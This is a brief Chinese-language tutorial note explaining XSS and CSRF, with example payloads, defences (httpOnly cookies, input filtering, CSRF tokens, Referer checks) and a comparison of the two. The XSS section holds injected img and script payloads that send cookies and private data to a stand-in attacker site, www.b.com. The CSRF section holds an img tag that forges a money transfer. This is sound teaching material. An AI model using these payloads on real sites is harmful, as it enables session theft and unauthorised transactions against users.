## 关于web安全的几个问题
### 跨站脚本攻击
* 即 Cross Site Scripting, 安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS ）有所区分，故称XSS。
* 攻击流程、条件
	- 受攻击的站点 A http://www.a.com 有一个用户留言页面，该页面提供用户留言的list，或者好有一个依赖cookie而匹配的私有信息的接口/showSecret，以及一个留言输入框。
	- 攻击的站点 B http://www.b.com/ 有两个个接口 /getCookie，/getList
	- 攻击者有两种攻击方式：
		+ 在留言输入框中输入 
		```
			<img src="http://www.b.com/getCookie/"+document.cookie >
		```
		如果A站点不做安全措施，就会导致当前信息存入数据库，以后每位用户访问这个list页面的时候，都会去请求这个接口，并且把cookie作为参数发送到了B站点

		+ 在留言处输入  
		```
			<script type="text/javascript">
				$.get('/showSecret',function(res){
					// 因为登录用户已经存在cookie, 所以会正常返回私有信息
					// 下面将 secret 发送到B站点
					$.get("http://www.b.com/getList"+res.secret,function(){});
					// 此处虽然跨域，但是并不影响请求的发送，于是secret就发送到了B站点
				})
			</script>
		```
* 解决方案
	- 服务器返回cookie的时候， 设置httpOnly:true，是js不能读取cookie，以解决第一种攻击方式
	- 输入框限制脚本，或者标签输入，或者做过滤，使得用户输入的内容不被当做代码执行

### 跨站请求伪造
* 即 Cross-site request forgery，通常缩写为CSRF或者XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。
* 攻击流程、条件
	- 站点 A http://www.a.com 有一个依赖cookie转账的接口，例如 /transfer?name=sunny&money=10000，转10000元给sunny
	- 站点 B http://www.b.com 中有一段恶意攻击的 img 请求
	```
		<img src="http://www.a.com/transfer?name=mayun&money=1" alt="">
	```
	- 如果用户登录了a 站点，并且在没有退出的情况下，又访问了b，这时候img请求就因为有了cookie发送成功，从而转账1元给mayun
* 解决方案
	- 用户打开转账页面的时候，a站点保存一个随机数，并返回到用户的转账页面，用户发起转账时，js代码将这个参数也携带上，再发起请求；
	 而用户打开B站点的时候，直接请求了转账接口，而不能获取转账页面的随机数，所以转账请求也没法传递随机参数；
	 如果随机数能与服务器上的匹配上，说明是正常页面在发起请求。
	- 手机验证码
	- referer，referer请求头会告诉A服务器，当前请求是由哪个页面发起请求的，如果是攻击者B站的页面发起的请求，则服务器A收到的referer是、
	 http://www.b.com 服务器a可以不予回应；当然这种方式也存在其它问题。


### 两种安全问题的比较
* 区别1、xss跨站脚本攻击是，在 被攻击的A站点提供的页面里 请求 攻击者B站点的接口；而csrf跨站请求伪造，是在攻击者B站点提供的页面里，请求被攻击者A站点的接口。
* 区别2、xss跨站脚本攻击，必须得是被攻击者页面提供一个输入框，并且其他用户能访问到输入内容。
* 区别3、csrf跨站请求，必须得是用户自己点击了B站点的链接。
* 共同点、都是利用了cookie。